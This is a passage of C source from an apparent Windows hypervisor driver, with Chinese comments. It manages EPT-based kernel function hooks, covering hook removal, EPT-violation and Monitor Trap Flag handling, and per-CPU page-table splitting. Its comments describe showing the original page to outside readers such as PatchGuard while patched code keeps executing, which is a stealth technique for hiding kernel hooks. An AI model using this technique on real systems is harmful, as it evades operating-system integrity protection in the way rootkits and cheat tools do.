        retirePage = TRUE;
    }

    if (pageWasActive) {
        PLIST_ENTRY link;

        if (page->ActiveSiteCount == 0) {
            status = STATUS_INVALID_DEVICE_STATE;
            goto Exit;
        }
        page->ActiveSiteCount--;
        if (HookEntry->OverlayVisible) {
            if (page->OverlaySiteCount == 0) {
                status = STATUS_INVALID_DEVICE_STATE;
                goto Exit;
            }
            page->OverlaySiteCount--;
        }
        if (!retirePage) {
            EptHookpRebuildCompositePage(page, NULL, HookEntry);
        }
        if (page->AccountingSite == HookEntry) {
            page->AccountingSite = NULL;
            for (link = g_EptHookManager.HookList.Flink;
                 link != &g_EptHookManager.HookList;
                 link = link->Flink) {
                PEPT_HOOK_ENTRY sibling = CONTAINING_RECORD(
                    link, EPT_HOOK_ENTRY, ListEntry);
                if (sibling != HookEntry &&
                    sibling->PageOwner == page &&
                    sibling->State == EptHookStateActive) {
                    page->AccountingSite = sibling;
                    break;
                }
            }
        }
    }

    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    RemoveEntryList(&HookEntry->ListEntry);
    if (g_EptHookManager.HookCount != 0) {
        g_EptHookManager.HookCount--;
    }
    if (page->SiteCount != 0) {
        page->SiteCount--;
    }
    if (retirePage && g_EptHookManager.PageCount != 0) {
        g_EptHookManager.PageCount--;
    }
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

    if (pageWasActive) {
        EptHookpClearPageMutation(page);
        if (page->ActiveSiteCount != 0) {
            if (page->OverlaySiteCount == 0) {
                RtlZeroMemory(
                    page->OverlayTargetPte,
                    sizeof(page->OverlayTargetPte));
                RtlZeroMemory(
                    page->OverlayOriginalPteValue,
                    sizeof(page->OverlayOriginalPteValue));
                page->OverlayTargetPteCount = 0;
            }
            MemoryBarrier();
            InterlockedExchange(
                (volatile LONG*)&page->State,
                (LONG)EptHookStateActive);
            EptHookpPublishCompositePage(page);
        } else if (!retirePage) {
            RtlZeroMemory(page->TargetPte, sizeof(page->TargetPte));
            RtlZeroMemory(
                page->OriginalPteValue,
                sizeof(page->OriginalPteValue));
            RtlZeroMemory(
                page->OverlayTargetPte,
                sizeof(page->OverlayTargetPte));
            RtlZeroMemory(
                page->OverlayOriginalPteValue,
                sizeof(page->OverlayOriginalPteValue));
            page->TargetPteCount = 0;
            page->OverlayTargetPteCount = 0;
            InterlockedExchange(
                (volatile LONG*)&page->State,
                (LONG)EptHookStatePrepared);
        }
    } else if (!retirePage && page->ActiveSiteCount == 0) {
        EptHookpRebuildCompositePage(page, NULL, NULL);
    }

    if (retirePage) {
        EptHookpClearPageMutation(page);
        MemoryBarrier();
        InterlockedExchange(
            (volatile LONG*)&page->State,
            (LONG)EptHookStateRetired);
        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        InsertTailList(
            &g_EptHookManager.RetiredPageList,
            &page->ListEntry);
        g_EptHookManager.RetiredPageCount++;
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
    }

    HookEntry->PatchInstalled = FALSE;
    HookEntry->PageOwner = NULL;
    MemoryBarrier();
    InterlockedExchange(
        (volatile LONG*)&HookEntry->State,
        (LONG)EptHookStateRetired);
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    InsertTailList(
        &g_EptHookManager.RetiredHookList,
        &HookEntry->ListEntry);
    g_EptHookManager.RetiredHookCount++;
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

    DbgPrint("[EPT-Hook] Removed composite site; GPA page sites=%lu active=%lu retired=%d\n",
             page->SiteCount,
             page->ActiveSiteCount,
             retirePage);
    ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    return STATUS_SUCCESS;

Exit:
    ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
ExitWithoutLock:
    InterlockedExchange(&HookEntry->Removing, 0);
    return status;
}

NTSTATUS
EptHookRemoveByAddress(_In_ PVOID TargetAddress)
{
    PEPT_HOOK_ENTRY hookEntry = NULL;
    KIRQL oldIrql;
    PLIST_ENTRY link;

    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    for (link = g_EptHookManager.HookList.Flink;
         link != &g_EptHookManager.HookList;
         link = link->Flink) {
        PEPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
            link, EPT_HOOK_ENTRY, ListEntry);
        if (candidate->TargetVirtualAddress == TargetAddress &&
            InterlockedCompareExchange(
                &candidate->Removing, 1, 0) == 0) {
            hookEntry = candidate;
            break;
        }
    }
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
    return hookEntry ? EptHookpRemoveClaimed(hookEntry)
                     : STATUS_NOT_FOUND;
}

VOID
EptHookRemoveAll(VOID)
{
    for (;;) {
        PEPT_HOOK_ENTRY hookEntry = NULL;
        NTSTATUS status;
        KIRQL oldIrql;

        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        if (!IsListEmpty(&g_EptHookManager.HookList)) {
            PLIST_ENTRY link;

            /* A timed-out page withdrawal owns the page mutation domain.
             * Retry that exact site before considering an unrelated sibling;
             * otherwise the first list entry can only report DEVICE_BUSY and
             * prevent unload from making progress. */
            for (link = g_EptHookManager.HookList.Flink;
                 link != &g_EptHookManager.HookList;
                 link = link->Flink) {
                PEPT_HOOK_ENTRY pending = CONTAINING_RECORD(
                    link, EPT_HOOK_ENTRY, ListEntry);
                if (pending->State == EptHookStateQuiescing &&
                    pending->PageOwner &&
                    pending->PageOwner->MutationKind ==
                        EPT_PAGE_MUTATION_REMOVE &&
                    pending->PageOwner->MutationSite == pending &&
                    InterlockedCompareExchange(
                        &pending->Removing, 1, 0) == 0) {
                    hookEntry = pending;
                    break;
                }
            }
        }
        if (!hookEntry &&
            !IsListEmpty(&g_EptHookManager.HookList)) {
            PEPT_HOOK_ENTRY candidate = CONTAINING_RECORD(
                g_EptHookManager.HookList.Flink,
                EPT_HOOK_ENTRY,
                ListEntry);
            if (InterlockedCompareExchange(
                    &candidate->Removing, 1, 0) == 0) {
                hookEntry = candidate;
            }
        }
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
        if (!hookEntry) {
            break;
        }
        status = EptHookpRemoveClaimed(hookEntry);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] RemoveAll retained composite site: 0x%X\n",
                     status);
            break;
        }
    }
    DbgPrint("[EPT-Hook] RemoveAll complete; remaining=%lu pages=%lu\n",
             g_EptHookManager.HookCount,
             g_EptHookManager.PageCount);
}

// ============================================================
// EPT Violation 处理
// ============================================================

/*
 * 设置 Monitor Trap Flag
 * 用于在单步执行后恢复 EPT 状态
 */
static BOOLEAN
EptSetMonitorTrapFlag(
    _In_ BOOLEAN Enable
)
{
    SIZE_T cpuCtls = 0;

    if (__vmx_vmread(
            VMCS_CTRL_PROCESSOR_BASED_VM_EXECUTION_CONTROLS,
            &cpuCtls) != 0) {
        return FALSE;
    }

    if (Enable) {
        cpuCtls |= CPU_BASED_MONITOR_TRAP_FLAG;
    } else {
        cpuCtls &= ~CPU_BASED_MONITOR_TRAP_FLAG;
    }

    return __vmx_vmwrite(
        VMCS_CTRL_PROCESSOR_BASED_VM_EXECUTION_CONTROLS,
        cpuCtls) == 0;
}

static BOOLEAN
EptHookpReadMonitorTrapFlag(_Out_ PBOOLEAN Enabled)
{
    SIZE_T cpuCtls = 0;

    if (!Enabled ||
        __vmx_vmread(
            VMCS_CTRL_PROCESSOR_BASED_VM_EXECUTION_CONTROLS,
            &cpuCtls) != 0) {
        return FALSE;
    }
    *Enabled = (cpuCtls & CPU_BASED_MONITOR_TRAP_FLAG) != 0;
    return TRUE;
}

/* Reserve the shared VMCS MTF before changing any EPT leaf.  IDLE plus an
 * already-set VMCS bit means xHCI/Vwatch/PEB owns this guest instruction and
 * EptHook must fail open without stealing its completion exit. */
static BOOLEAN
EptHookpReserveMtfPage(
    _Inout_ PEPT_MTF_CONTEXT Mtf,
    _In_ PEPT_HOOK_PAGE Page)
{
    LONG state;
    LONG count;
    ULONG slot;
    BOOLEAN enabled;

    if (!Mtf || !Page) {
        return FALSE;
    }

    for (;;) {
        state = InterlockedCompareExchange(&Mtf->MtfActive, 0, 0);
        if (state == EPT_HOOK_MTF_IDLE) {
            if (!EptHookpReadMonitorTrapFlag(&enabled) || enabled) {
                return FALSE;
            }
            if (InterlockedCompareExchange(
                    &Mtf->MtfActive,
                    EPT_HOOK_MTF_PUBLISHING,
                    EPT_HOOK_MTF_IDLE) != EPT_HOOK_MTF_IDLE) {
                continue;
            }

            for (slot = 0; slot < EPT_HOOK_MAX_PENDING_PAGES; ++slot) {
                Mtf->PendingPage[slot] = NULL;
            }
            InterlockedExchange(&Mtf->PendingPageCount, 0);
            Mtf->PendingPage[0] = Page;
            MemoryBarrier();
            InterlockedExchange(&Mtf->PendingPageCount, 1);
            MemoryBarrier();
            InterlockedExchange(&Mtf->MtfActive, EPT_HOOK_MTF_ARMED);

            if (!EptSetMonitorTrapFlag(TRUE)) {
                Mtf->PendingPage[0] = NULL;
                InterlockedExchange(&Mtf->PendingPageCount, 0);
                MemoryBarrier();
                InterlockedExchange(&Mtf->MtfActive, EPT_HOOK_MTF_IDLE);
                return FALSE;
            }
            return TRUE;
        }

        if (state != EPT_HOOK_MTF_ARMED ||
            !EptHookpReadMonitorTrapFlag(&enabled) || !enabled) {
            return FALSE;
        }

        count = InterlockedCompareExchange(&Mtf->PendingPageCount, 0, 0);
        if (count < 0 || count > EPT_HOOK_MAX_PENDING_PAGES) {
            return FALSE;
        }
        for (slot = 0; slot < (ULONG)count; ++slot) {
            if (Mtf->PendingPage[slot] == Page) {
                return TRUE;
            }
        }
        if (count == EPT_HOOK_MAX_PENDING_PAGES) {
            return FALSE;
        }

        Mtf->PendingPage[count] = Page;
        MemoryBarrier();
        InterlockedExchange(&Mtf->PendingPageCount, count + 1);
        return TRUE;
    }
}

BOOLEAN
EptHookHandleViolation(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 GuestPhysicalAddress,
    _In_ ULONG64 ExitQualification
)
{
    PEPT_HOOK_PAGE page;
    ULONG64 pagePhysical;
    BOOLEAN isExecute;
    BOOLEAN isRead;
    BOOLEAN isWrite;
    ULONG cpuIndex;
    PEPT_MTF_CONTEXT mtfCtx;
    SIZE_T guestRip = 0;
    ULONG64 guestRipPhysical = 0;
    BOOLEAN ripOnSamePage = FALSE;
    PEPT_PTE_ENTRY activePte;
    static volatile LONG violationCount = 0;
    LONG currentViolation;
    ULONG rootEpoch;
    
    // 获取页对齐的物理地址
    pagePhysical = GuestPhysicalAddress & PAGE_MASK;

    // 解析 Exit Qualification
    isRead = (ExitQualification & EPT_VIOLATION_READ) != 0;
    isWrite = (ExitQualification & EPT_VIOLATION_WRITE) != 0;
    isExecute = (ExitQualification & EPT_VIOLATION_EXECUTE) != 0;

    if (!VcpuData || VcpuData->ProcessorNumber >= 64) {
        return FALSE;
    }
    cpuIndex = VcpuData->ProcessorNumber;

    if (!EptHookpAcquireRootEpoch(&rootEpoch)) {
        return FALSE;
    }

    // 查找 Hook（高 IRQL 下避免加锁）
    // 注意：在 VM Exit 中总是使用无锁版本，因为处于 VMX root 模式
    page = EptHookFindPageByPhysicalAddressNoLock(pagePhysical);

    if (!page) {
        // 不是我们的 Hook，返回 FALSE 让其他代码处理
        EptHookpReleaseRootEpoch(rootEpoch);
        return FALSE;
    }

    // 安全检查：验证 hookEntry 仍然有效 (P1-3: 检查当前 CPU 的 PTE)
    activePte = EptHookpSelectPagePte(page, VcpuData, cpuIndex);
    if (page->State != EptHookStateActive || !activePte) {
        // Hook 已被移除或当前 CPU 没装上(processorCount<64 或该核 EPT 未启用)
        EptHookpReleaseRootEpoch(rootEpoch);
        return FALSE;
    }
    
    // 读取 Guest RIP 并检查是否在同一个页面上
    // 这对于正确处理 Read Violation 至关重要
    __vmx_vmread(GUEST_RIP, &guestRip);

    // 注:第八轮一度在此加 per-CPU 同 RIP 64 次注 #UD 切断,但 hook
    // 频繁触发是正常的(ObReferenceObjectByName 被 PopPolicyWorker
    // 周期调用,RIP-relative read + 多核并发会让任何阈值都被很快踩穿
    // → #UD on push rbp → 0x1000007e SYSTEM_THREAD_EXCEPTION_NOT_HANDLED)。
    // 已撤回。如确需切断 hook 死循环,需要更精细的 "RIP 不前进 + N 次同
    // 一 hook entry" 联合判定,放在 MTF exit handler 里更合适。

    // 检查 RIP 是否在被 Hook 的页面上
    // 注意：这里简化处理，假设内核地址的虚拟-物理映射是 1:1 的
    // 对于内核代码段，这个假设通常成立
    {
        ULONG64 ripPageVa = guestRip & PAGE_MASK;
        ULONG64 targetPageVa = (ULONG64)page->TargetPageVirtual;
        ripOnSamePage = (ripPageVa == targetPageVa);
    }
    
    // 记录 violation 次数（减少日志输出）
    currentViolation = InterlockedIncrement(&violationCount);
    // 注意：在 VMX root 模式下避免调用 DbgPrint，可能导致蓝屏
    // 只在非常必要时启用调试输出
#if 0  // 禁用 VMX root 模式下的 DbgPrint
    if (currentViolation <= 5) {
        DbgPrint("[EPT-Hook] Violation #%d: GPA=0x%llx R=%d W=%d X=%d RIP=0x%llx SamePage=%d\n",
            currentViolation, GuestPhysicalAddress, isRead, isWrite, isExecute, 
            (ULONG64)guestRip, ripOnSamePage);
    }
#endif
    
    // 增加命中计数
    InterlockedIncrement64(&page->HitCount);
    if (page->AccountingSite) {
        InterlockedIncrement64(&page->AccountingSite->HitCount);
    }

    // 获取当前 CPU 的 MTF 上下文 (cpuIndex 已在函数顶部 P1-3 设置)
    mtfCtx = &g_EptHookManager.MtfContext[cpuIndex];
    
    if (g_EptHookManager.ExecuteOnlySupported) {
        // =====================================================
        // Execute-Only 模式处理
        // 初始状态：FakePage, R=0, W=0, X=1
        // =====================================================
        
        if (isRead || isWrite) {
            if (!EptHookpReserveMtfPage(mtfCtx, page)) {
                EptHookpRestorePageOriginalLeafForVcpu(
                    page, VcpuData, cpuIndex);
                EptInveptAllContexts();
                EptHookpReleaseRootEpoch(rootEpoch);
                return TRUE;
            }
            // 读/写访问触发 Violation（因为 R=0, W=0）
            // 
            // 关键设计决策：
            // - 如果 RIP 在同一页面：保持 FakePage，只开放 RWX 权限
            //   这样代码继续在 FakePage 上执行（Hook 仍然生效）
            // - 如果 RIP 不在同一页面：切换到 OriginalPage
            //   这样 PatchGuard 读取时看到未修改的原始代码
            
            if (ripOnSamePage) {
                // =====================================================
                // 情况 1：RIP 在被 Hook 的页面上执行代码
                //
                // 这意味着 Hook 函数或跳板正在执行，并且需要读取/写入同一页的数据
                // （例如 RIP-relative 寻址）
                //
                // 解决方案：保持 FakePage，临时开放 RWX 权限
                // 这样数据读取成功，代码继续在 FakePage 上执行
                // =====================================================
                EptSetPteAtomic(activePte,
                                page->FakePagePhysical >> 12, 1, 1, 1);
                EptInveptAllContexts();

                // 注意：VMX root 模式下不要调用 DbgPrint
            } else {
                // =====================================================
                // 情况 2：RIP 不在被 Hook 的页面上
                //
                // 这意味着外部代码（如 PatchGuard）正在读取被 Hook 的页面
                //
                // 解决方案：切换到 OriginalPage，让读取返回原始代码
                // 设置 X=0 防止在此期间执行（这是安全的因为 RIP 不在这里）
                // =====================================================
                EptSetPteAtomic(activePte,
                                page->TargetPhysicalAddress >> 12, 1, 1, 0);
                EptInveptAllContexts();

                // 注意：VMX root 模式下不要调用 DbgPrint
            }
            
        }
        else if (isExecute) {
            // 执行 Violation 在 Execute-Only 模式下不应该发生（因为 X=1）
            // 可能原因：
            // 1. TLB 不同步（INVEPT 未生效）
            // 2. 之前的 Read Violation 设置了 X=0
            // 3. 竞态条件
            // 注意：VMX root 模式下不要调用 DbgPrint
            
            // 恢复到 FakePage 状态 (R=0, W=0, X=1)
            EptSwitchToFakePage(VcpuData, page, cpuIndex);
        }
    }
    // 注意：不再支持回退模式，只使用 Execute-Only 模式
    
    EptHookpReleaseRootEpoch(rootEpoch);
    return TRUE;
}

/*
 * 处理 Monitor Trap Flag Exit
 * 在单步执行后恢复 EPT 到安全/稳定状态
 * 
 * 重要：MTF 在 Guest 执行一条指令后触发，此时需要恢复正确的 EPT 状态
 */
BOOLEAN
EptHookHandleMtfExit(_In_ PVCPU_DATA VcpuData)
{
    ULONG cpuIndex;
    PEPT_MTF_CONTEXT mtfCtx;
    ULONG count;
    ULONG slot;
    BOOLEAN changed = FALSE;
    
    if (!VcpuData || VcpuData->ProcessorNumber >= 64) return FALSE;
    cpuIndex = VcpuData->ProcessorNumber;
    mtfCtx = &g_EptHookManager.MtfContext[cpuIndex];
    
    if (InterlockedCompareExchange(
            &mtfCtx->MtfActive,
            EPT_HOOK_MTF_COMPLETING,
            EPT_HOOK_MTF_ARMED) != EPT_HOOK_MTF_ARMED) {
        /* xHCI/Vwatch/PEB owns this exit.  Never clear another subsystem's
         * VMCS MTF bit. */
        return FALSE;
    }

    MemoryBarrier();
    count = (ULONG)InterlockedCompareExchange(
        &mtfCtx->PendingPageCount, 0, 0);
    if (count > EPT_HOOK_MAX_PENDING_PAGES) {
        count = EPT_HOOK_MAX_PENDING_PAGES;
    }
    EptSetMonitorTrapFlag(FALSE);

    for (slot = 0; slot < count; ++slot) {
        PEPT_HOOK_PAGE page =
            (PEPT_HOOK_PAGE)mtfCtx->PendingPage[slot];
        PEPT_PTE_ENTRY activePte = EptHookpSelectPagePte(
            page, VcpuData, cpuIndex);

        if (!page || !activePte) {
            continue;
        }
        if (page->State == EptHookStateActive) {
            EptSetPteAtomic(activePte,
                            page->FakePagePhysical >> 12, 0, 0, 1);
            changed = TRUE;
        } else if (EptHookpRestorePageOriginalLeafForVcpu(
                       page, VcpuData, cpuIndex)) {
            changed = TRUE;
        }
    }
    if (changed) {
        EptInveptAllContexts();
    }

    for (slot = 0; slot < EPT_HOOK_MAX_PENDING_PAGES; ++slot) {
        mtfCtx->PendingPage[slot] = NULL;
    }
    InterlockedExchange(&mtfCtx->PendingPageCount, 0);
    MemoryBarrier();
    InterlockedExchange(&mtfCtx->MtfActive, EPT_HOOK_MTF_IDLE);
    return TRUE;
}

/*
 * #24: 防御性恢复 —— 见 EptHook.h 注释。
 * 在 VMX root 模式 / IPI_LEVEL 运行,禁止 DbgPrint。
 */
BOOLEAN
EptHookDefensiveRecover(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 GuestPhysicalAddress,
    _In_ ULONG64 ExitQualification
)
{
    UNREFERENCED_PARAMETER(ExitQualification);

    ULONG64 pagePhysical = GuestPhysicalAddress & PAGE_MASK;
    PEPT_HOOK_PAGE page;
    PEPT_PTE_ENTRY activePte;
    ULONG defensiveCpuIndex;
    ULONG rootEpoch;

    if (!VcpuData || VcpuData->ProcessorNumber >= 64 ||
        !EptHookpAcquireRootEpoch(&rootEpoch)) {
        return FALSE;
    }
    defensiveCpuIndex = VcpuData->ProcessorNumber;
    page = EptHookFindPageByPhysicalAddressNoLock(pagePhysical);
    activePte = EptHookpSelectPagePte(
        page, VcpuData, defensiveCpuIndex);
    if (!page || !activePte) {
        EptHookpReleaseRootEpoch(rootEpoch);
        return FALSE;
    }

    /* Once withdrawal is published, defensive recovery must not recreate a
     * synthesized RWX identity leaf after Remove restored the saved policy.
     * A Quiescing entry is still linked specifically so this fallback can
     * make forward progress using its exact original per-CPU leaf. */
    if (page->State != EptHookStateActive) {
        BOOLEAN restored = EptHookpRestorePageOriginalLeafForVcpu(
            page, VcpuData, defensiveCpuIndex);
        if (restored) {
            EptInveptAllContexts();
        }
        EptHookpReleaseRootEpoch(rootEpoch);
        return restored;
    }

    ULONG cpuIndex = defensiveCpuIndex;
    PEPT_MTF_CONTEXT mtfCtx = &g_EptHookManager.MtfContext[cpuIndex];

    if (!EptHookpReserveMtfPage(mtfCtx, page)) {
        EptHookpRestorePageOriginalLeafForVcpu(
            page, VcpuData, defensiveCpuIndex);
        EptInveptAllContexts();
        EptHookpReleaseRootEpoch(rootEpoch);
        return TRUE;
    }

    // Reservation is visible before the temporary leaf is published.
    EptSetPteAtomic(activePte,
                    page->TargetPhysicalAddress >> 12, 1, 1, 1);
    EptInveptAllContexts();

    EptHookpReleaseRootEpoch(rootEpoch);
    return TRUE;
}

// ============================================================
// EPT 页表操作
// ============================================================

/*
 * 分割 2MB 大页为 512 个 4KB 页
 * 
 * @param LargePagePde   指向 2MB 大页 PDE 的指针
 * @param BasePhysAddr   大页的基物理地址
 * @return 新分配的 PT 表，失败返回 NULL
 */
static PEPT_ENTRY
EptSplit2MBPage(
    _Inout_ PEPT_TABLES EptTables,
    _In_ PEPT_ENTRY LargePagePde,
    _In_ ULONG64 BasePhysAddr
)
{
    PHYSICAL_ADDRESS ptPhysical;
    PEPT_ENTRY newPtTable;
    ULONG i;
    ULONG64 originalPermissions;
    
    newPtTable = (PEPT_ENTRY)HvEptAllocateSplitPt(EptTables, &ptPhysical);
    if (!newPtTable) {
        DbgPrint("[EPT-Hook] Failed to allocate PT table for 2MB split\n");
        return NULL;
    }
    
    RtlZeroMemory(newPtTable, PAGE_SIZE_4KB);
    
    // 保存原始权限
    originalPermissions = LargePagePde->Value & 0x7;  // R/W/X 位
    
    // 创建 512 个 4KB 页条目
    for (i = 0; i < 512; i++) {
        newPtTable[i].Value = 0;
        newPtTable[i].Read = (originalPermissions & EPT_READ) ? 1 : 0;
        newPtTable[i].Write = (originalPermissions & EPT_WRITE) ? 1 : 0;
        newPtTable[i].Execute = (originalPermissions & EPT_EXECUTE) ? 1 : 0;
        newPtTable[i].MemoryType = HvEptGetMemoryType(
            BasePhysAddr + ((ULONG64)i * PAGE_SIZE_4KB), PAGE_SIZE_4KB);
        newPtTable[i].PhysicalPageNumber = (BasePhysAddr >> 12) + i;
    }
    
    DbgPrint("[EPT-Hook] Split 2MB page at PA 0x%llx into 512 x 4KB pages\n", BasePhysAddr);
    DbgPrint("[EPT-Hook] New PT table at VA %p, PA 0x%llx\n", 
        newPtTable, ptPhysical.QuadPart);
    
    return newPtTable;
}

/*
 * Per-CPU 4KB PTE setup (P1-3 / HyperDbg 范式, 2026-05-31):
 *   - 每个 CPU 的 EPT 表独立 split 2MB → 自己的 PT 表
 *   - 自己的 PDE 指向自己的 PT
 *   - hookEntry->TargetPte[cpu] 指向 per-CPU PT 中对应的 PTE
 *
 * Why: 旧实现 (EptGetOrCreatePteForHook) 创建一份 newPtTable 后让所有 CPU 的
 *   PDE 都指向它 (共享 PT)。Win11 高频 NtQuerySystemInformation 多核并发命中
 *   同一 PTE,A 核改 RWX、B 核改 R/W/X-only、C 核 MTF 恢复——三种策略覆盖同
 *   一条 cmpxchg64 写入,最后哪个赢非确定 → 输的核 guest 重试又 violation →
 *   死循环。HyperDbg 范式每核独立 PT 物理隔离根除冲突。
 *
 * 仅用于 Hook Activate 阶段 (PASSIVE_LEVEL)。Prepare 不得调用本函数，
 * 因为首次解析可能需要把 identity-mapped 2 MB leaf 细分为 4 KB leaf。
 *
 * 返回 TRUE 表示所有可用 CPU 都已 split 完成、TargetPte[] 填好。
 */
static BOOLEAN
EptSetupPerCpuPtesForHook(
    _In_ ULONG64 PhysicalAddress,
    _Inout_ PEPT_HOOK_ENTRY HookEntry
)
{
    ULONG64 pml4Index, pdptIndex, pdIndex, ptIndex;
    PVCPU_DATA vcpuData;
    PEPT_TABLES eptTables;
    PEPT_PDE pde;
    PEPT_ENTRY newPtTable;
    ULONG cpuIndex;
    ULONG processorCount;
    ULONG64 newPtPhysical;
    ULONG successCount = 0;

    if (!HookEntry) {
        return FALSE;
    }

    // 先全部清零 (HookEntry 来自 HvAllocateNonPagedZeroed 已是 0,这里再确保一次)
    for (cpuIndex = 0; cpuIndex < RTL_NUMBER_OF(HookEntry->TargetPte); cpuIndex++) {
        HookEntry->TargetPte[cpuIndex] = NULL;
    }

    if (!(g_HypervisorContext.IsActive && g_HypervisorContext.VcpuData)) {
        return FALSE;
    }

    pml4Index = (PhysicalAddress >> 39) & 0x1FF;
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex   = (PhysicalAddress >> 21) & 0x1FF;
    ptIndex   = (PhysicalAddress >> 12) & 0x1FF;

    // 仅支持低 512GB 的已知结构 (PML4[0])
    if (pml4Index != 0 || pdptIndex >= 512) {
        return FALSE;
    }

    processorCount = g_HypervisorContext.ProcessorCount;
    if (processorCount == 0 ||
        processorCount > RTL_NUMBER_OF(HookEntry->TargetPte)) {
        DbgPrint("[EPT-Hook] %u CPUs exceed per-hook PTE capacity\n",
                 processorCount);
        return FALSE;
    }

    // 遍历所有 CPU,每核独立 split / 找 PT
    for (cpuIndex = 0; cpuIndex < processorCount; cpuIndex++) {
        vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        if (!vcpuData->IsVirtualized || !vcpuData->EptTables) {
            continue;  // 该核未启用 EPT,跳过
        }
        eptTables = vcpuData->EptTables;
        pde = &eptTables->Pd[pdptIndex][pdIndex];

        if (!(pde->Read || pde->Write || pde->Execute)) {
            // PDE 未映射 → 该核无法 hook 这个 PA
            continue;
        }

        if (pde->Value & (1ULL << 7)) {
            // 2MB Large Page → 该核独立 split 出自己的 PT
            newPtTable = EptSplit2MBPage(
                eptTables,
                (PEPT_ENTRY)pde,
                PhysicalAddress & ~0x1FFFFFULL);
            if (!newPtTable) {
                DbgPrint("[EPT-Hook] CPU %u: PT alloc failed for PA 0x%llx\n",
                         cpuIndex, PhysicalAddress);
                continue;
            }
            newPtPhysical = MmGetPhysicalAddress(newPtTable).QuadPart;

            // 该核的 SplitPt[] 记录自己的 PT (供 HvVmExit.c fallback 反查)
            // 更新该核 PDE 指向自己的 PT —— 必须一次性 64-bit 原子 store,
            // 否则 guest 另一核可能 walk 到 (PFN=0,R=W=X=1) 这种 garbage 中间态,
            // EPT walk 拿到的 GPA→HPA 翻译指到物理 0 页 / 别的进程页 → 上层 OS
            // 通过 self-map PTE 解析时取到错值 → MiResolvePageTablePage 蓝屏。
            {
                EPT_PDE newPde;
                newPde.Value = 0;
                newPde.Read = 1;
                newPde.Write = 1;
                newPde.Execute = 1;
                newPde.PageFrameNumber = newPtPhysical >> 12;
                InterlockedExchange64((LONG64 volatile *)&pde->Value, (LONG64)newPde.Value);
            }

            HookEntry->TargetPte[cpuIndex] = (PEPT_PTE_ENTRY)&newPtTable[ptIndex];
            successCount++;
        } else {
            // 非大页 → PDE 已指向 PT
            // 2026-05-31 修复: 优先从 eptTables->SplitPt[] 反查已分配的 PT VA,
            // 避免 MmMapIoSpace (在 NtQSI 风暴下 12 CPU 困 root mode → IPI 死锁卡死)。
            // SplitPt[] 在首次 split 时已记录每核自己的 PT (VA + PA),后续同 PDE
            // 上的 hook 直接拿这里的 VA 即可。
            ULONG64 ptPfn = (ULONG64)pde->PageFrameNumber;
            PEPT_PTE existingPt = HvEptFindSplitPt(eptTables, ptPfn);
            if (existingPt) {
                HookEntry->TargetPte[cpuIndex] = (PEPT_PTE_ENTRY)&existingPt[ptIndex];
                successCount++;
            } else {
                // 兜底: SplitPt[] 没记录 (PDE 是 boot 时就分裂的,非本模块 split)
                // 回退 MmMapIoSpace — 仅在 hypervisor 未跑大量 violation 风暴时安全
                DbgPrint("[EPT-Hook] CPU %u has an untracked PT for PA 0x%llx\n",
                         cpuIndex, PhysicalAddress);
                continue;
            }
        }
    }

    if (successCount != processorCount) {
        DbgPrint("[EPT-Hook] EptSetupPerCpuPtesForHook: only %u/%u CPUs succeeded for PA 0x%llx\n",
                 successCount, processorCount, PhysicalAddress);
        return FALSE;
    }

    // 2026-05-31 修复: 不再主动 EptInveptAllContexts() — 改用 g_EptVersion 递增
    // 让每个 CPU 在下次 vmexit 时 EptCheckAndInvalidateTlb 自动刷新。
    //
    // 原因: 第一个 hook 激活后, NtQSI 风暴让 12 CPU 全部在 root mode 处理 EPT
    // violation。此时装第二个 hook 调 KeIpiGenericCall(IPI vector 0xE1) → IPI
    // 通过 LAPIC 投递到目标 CPU, 但目标在 root mode 时中断走 host IDT 的
    // Windows KiIpiInterrupt → KPRCB 错位崩 / 或 sender 永远等不到 ack → 卡死。
    //
    // 安全性: g_EptVersion 是 64-bit 原子计数, 每次 vmexit dispatcher 入口
    // EptCheckAndInvalidateTlb 比较 per-CPU LastEptVersion → 不同就 INVEPT 本核。
    // 唯一窗口: 新 PDE 写完到该核首次 vmexit 之间, guest 可能仍用旧 TLB 看到
    // 大页映射 — 但 split 后大页 PDE 仍指向相同物理范围,只是粒度变细,行为正确。
    EptIncrementVersion();

    DbgPrint("[EPT-Hook] EptSetupPerCpuPtesForHook: %u/%u CPUs OK for PA 0x%llx (deferred INVEPT)\n",
             successCount, processorCount, PhysicalAddress);
    return TRUE;
}

static BOOLEAN
EptSetupPerCpuOverlayPtesForPage(
    _In_ ULONG64 PhysicalAddress,
    _Inout_ PEPT_HOOK_PAGE Page)
{
    ULONG64 pml4Index;
    ULONG64 pdptIndex;
    ULONG64 pdIndex;
    ULONG64 ptIndex;
    ULONG processorCount;
    ULONG overlayCount = 0;
    ULONG successCount = 0;

    if (!Page || !g_HypervisorContext.IsActive ||
        !g_HypervisorContext.VcpuData) {
        return FALSE;
    }

    pml4Index = (PhysicalAddress >> 39) & 0x1FF;
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex = (PhysicalAddress >> 21) & 0x1FF;
    ptIndex = (PhysicalAddress >> 12) & 0x1FF;
    if (pml4Index != 0 || pdptIndex >= 512) return FALSE;

    processorCount = g_HypervisorContext.ProcessorCount;
    if (processorCount == 0 ||
        processorCount > RTL_NUMBER_OF(Page->OverlayTargetPte)) {
        return FALSE;
    }

    RtlZeroMemory(
        Page->OverlayTargetPte,
        sizeof(Page->OverlayTargetPte));
